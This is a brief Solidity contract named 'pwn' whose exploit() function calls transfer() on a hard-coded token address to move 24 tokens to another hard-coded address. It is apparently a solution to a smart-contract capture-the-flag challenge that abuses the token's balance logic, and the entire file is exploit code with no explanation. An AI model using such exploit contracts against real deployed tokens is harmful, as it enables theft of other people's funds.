// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Itoken {
    function transfer(address _to, uint _value) external returns (bool);
}

contract pwn {
    address addr = 0xCD403040621eB875b8CBEd6331cD58e4a51CF3dD;

    function exploit() public  {
        Itoken(addr).transfer(0x944bf6FF2e751c2d22D8Cdaad0204640B2620955,24);
    }
}
